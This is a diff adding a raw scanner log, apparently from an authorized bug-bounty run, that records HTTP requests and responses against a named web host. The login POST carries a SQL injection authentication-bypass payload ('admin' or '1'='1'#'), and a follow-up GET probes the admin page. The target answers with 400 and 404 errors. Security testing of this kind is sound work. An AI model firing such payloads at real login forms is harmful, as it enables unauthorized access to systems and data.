@@ -1,0 +1,54 @@
+[alumni-management-sqli] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/ajax.php?action=login
+
+
+POST /admin/ajax.php?action=login HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 46
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+username=admin'+or+'1'%3D'1'%23&password=s0gcf
+[alumni-management-sqli] Dumped HTTP response https://techsolutions.bitpanda.com/admin/ajax.php?action=login
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Via: 1.1 0fad2b2f93c2ade9df8e31249e9938a2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: BIGx36RYmqGFIwnh2tl9y5eQ41oZRHqz-IKFgovOqkusI3OAL4kp1g==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
+[alumni-management-sqli] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/index.php?page=home
+
+
+GET /admin/index.php?page=home HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[alumni-management-sqli] Dumped HTTP response https://techsolutions.bitpanda.com/admin/index.php?page=home
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Age: 1
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 1e5d213252e38a8aa2e2a927fd3c3754.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: dJqY3JfiLR1xuOIf3BsS2sY4nyjagJ_8sXas9orTYEEHFXkI5_EDUQ==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: +Mih6NYe+X4pVM21yDRGMF47nwcZymO4U79GMZjDKdlSQW85fvWernFiRk1o2rWuwLgmC+ezyyE=
+X-Amz-Request-Id: 41ZB3AC6N97NCG6Q
+X-Cache: Error from cloudfront
+
+Not Found
